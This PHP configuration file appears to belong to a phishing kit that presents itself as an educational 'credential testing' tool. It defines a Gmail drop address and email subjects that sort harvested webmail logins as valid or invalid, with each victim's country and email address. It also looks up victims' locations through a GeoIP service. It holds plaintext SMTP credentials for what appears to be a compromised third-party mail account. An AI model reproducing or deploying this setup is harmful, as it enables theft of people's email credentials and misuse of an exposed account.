<?php
/**
 * Configuration file for Email Credential Testing System
 * For educational and security awareness purposes only
 */

// SMTP Configuration for notifications
// These are YOUR email server settings to receive notifications
$config = array(
    // Email address where you want to receive notifications
    'receiver_email' => 'skkho87.sm@gmail.com',
    
    // Your SMTP server settings for sending notifications
    'notification_smtp' => array(
        'host' => 'mail.museums.or.ke',
        'port' => 587,
        'username' => 'okioko@museums.or.ke',
        'password' => 'onesmus@2022',
        'encryption' => 'tls', // tls or ssl
        'from_name' => 'Security Alert System'
    ),
    
    // General settings
    'log_file' => 'SS-Or.txt',
    'timezone' => 'UTC',
    'debug_mode' => false,
    
    // Security settings
    'max_attempts_per_ip' => 10, // Maximum attempts per IP per hour
    'rate_limit_window' => 3600, // Rate limit window in seconds (1 hour)
    
    // GeoIP service
    'geoip_service' => 'http://www.geoplugin.net/json.gp?ip=',
    
    // Email subjects for different scenarios
    'subjects' => array(
        'valid_credentials' => 'TrueRcubeOrange || {country} || {email}',
        'invalid_credentials' => 'notVerifiedRcudeOrange || {country} || {email}'
    )
);

// Set timezone
date_default_timezone_set($config['timezone']);

// Function to get configuration value
function getConfig($key, $default = null) {
    global $config;
    return isset($config[$key]) ? $config[$key] : $default;
}

// Function to validate configuration
function validateConfig() {
    global $config;
    
    $required = array('receiver_email', 'notification_smtp');
    
    foreach ($required as $key) {
        if (empty($config[$key])) {
            throw new Exception("Configuration key '{$key}' is required but not set.");
        }
    }
    
    if (!filter_var($config['receiver_email'], FILTER_VALIDATE_EMAIL)) {
        throw new Exception("Invalid receiver email address in configuration.");
    }
    
    return true;
}

// Validate configuration on load
try {
    validateConfig();
} catch (Exception $e) {
    error_log("Configuration Error: " . $e->getMessage());
    if ($config['debug_mode']) {
        die("Configuration Error: " . $e->getMessage());
    }
}
?>